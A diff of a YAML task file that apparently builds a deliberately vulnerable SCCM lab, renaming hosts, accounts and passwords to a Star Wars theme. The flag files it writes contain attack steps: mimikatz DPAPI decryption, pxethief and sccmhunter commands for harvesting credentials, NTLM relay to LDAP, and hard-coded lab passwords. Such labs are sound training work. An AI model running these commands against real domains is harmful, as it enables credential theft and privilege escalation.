@@ -1,7 +1,7 @@
 ---
 # ==============================================================================
 # vuln_exchange/tasks/sccm.yml — SRV-021..040
-# Target: file01.corp.local
+# Target: scarif.empire.local
 #
 # SRV-021  SCCM client installed with NAA credentials
 # SRV-022  SCCM admin service accessible (REST API on 10122/tcp)
@@ -65,7 +65,7 @@
           Decrypt with:
           mimikatz# lsadump::dpapi /unprotect /guid:<GUID>
 
-        Account: {{ sccm_naa_account }} / DVADlab2024!
+        Account: {{ sccm_naa_account }} / SithLord123!
         See also: FLAG-CRED-060 (NAA blob stub in C:\Flags\)
 
     - path: 'C:\Flags\FLAG-SRV-023-SCCM-PXE.txt'
@@ -78,7 +78,7 @@
 
         Tools: pxethief.py, PXEThief-PowerShell
         Attack:
-          python3 pxethief.py -i 10.10.0.0/21 -s file01.corp.local
+          python3 pxethief.py -i 10.10.0.0/21 -s scarif.empire.local
           → Captures encrypted task sequence variables
           → Decrypts embedded admin credentials
 
@@ -95,7 +95,7 @@
           3. Relay auth to LDAP → escalate
 
         Tools: SharpSCCM, sccmhunter
-        sccmhunter smb -u jim.halpert -p Password123! -d corp.local -dc-ip 10.10.0.10
+        sccmhunter smb -u luke.skywalker -p SithLord123! -d empire.local -dc-ip 10.10.0.10
 
     - path: 'C:\Flags\FLAG-SRV-032-SCCM-TaskSeq.txt'
       content: |
@@ -106,7 +106,7 @@
 
         Extraction:
           SharpSCCM.exe get tasksequence
-          sccmhunter tasksequence -u jim.halpert -p Password123!
+          sccmhunter tasksequence -u luke.skywalker -p SithLord123!
 
         Common credential variables:
           OSDLocalAdminPassword, OSDDomainAdminPassword, SMSTSRunCommandLineUserName
